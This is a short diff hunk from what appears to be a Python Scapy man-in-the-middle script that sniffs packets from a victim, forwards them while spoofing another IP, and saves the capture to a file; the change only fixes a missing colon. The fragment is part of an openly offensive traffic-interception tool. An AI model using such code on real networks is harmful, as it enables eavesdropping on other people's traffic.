@@ -34,5 +34,5 @@ def startforwarding(ipToSpoof, ifa, timeOut, output):
         lfilter = lambda(p): p[Ether].src != attackerMac,
         prn = lambda(p): forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa))
     #save sniffed packets
-    if (output)
+    if (output):
         wrpcap(output, packets)
